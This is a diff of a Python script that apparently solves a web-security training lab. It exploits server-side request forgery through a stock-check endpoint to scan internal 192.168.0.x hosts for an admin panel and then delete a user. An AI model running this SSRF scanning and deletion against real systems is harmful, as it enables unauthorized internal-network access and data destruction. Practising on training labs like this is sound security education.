@@ -1,23 +1,20 @@
 from ..utils import *
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-
-import requests
 
 
-def solve_lab(url, proxies):
-    url = urljoin(url, "/product/stock")
+def solve_lab(session):
+    path = "/product/stock"
     data = "{'stockApi': 'http://192.168.0.\033[1;93m?\033[00m:8080/admin'}"
 
     print_info(
-        f'Scanning the internal network by sending POST requests to "{url}" with the following data:'
+        f'Scanning the internal network by sending POST requests to "{path}" with the following data:'
     )
     print(f"{data}")
 
     for i in range(1, 255):
         internal_url = f"http://192.168.0.{i}:8080/admin"
         data = {"stockApi": internal_url}
-        resp = requests.post(url, proxies=proxies, verify=False, data=data)
+        resp = session.post_path(path, data=data)
 
         if resp.status_code != 200:
             print_info_secondary(f"{i} => {resp.status_code}", end="")
@@ -39,12 +36,12 @@ def solve_lab(url, proxies):
 
     data = {"stockApi": ssrf}
     print_info(
-        f'Deleting the user carlos by sending a POST request to "{url}" with the following data:'
+        f'Deleting the user carlos by sending a POST request to "{path}" with the following data:'
     )
     print(f"{data}")
 
     try:
-        resp = requests.post(url, proxies=proxies, verify=False, data=data)
+        resp = session.post_path(path, data=data)
         print_success("POST request sent successfully.\n")
     except requests.exceptions.ConnectionError:
         print_info("requests.exceptions.ConnectionError\n")
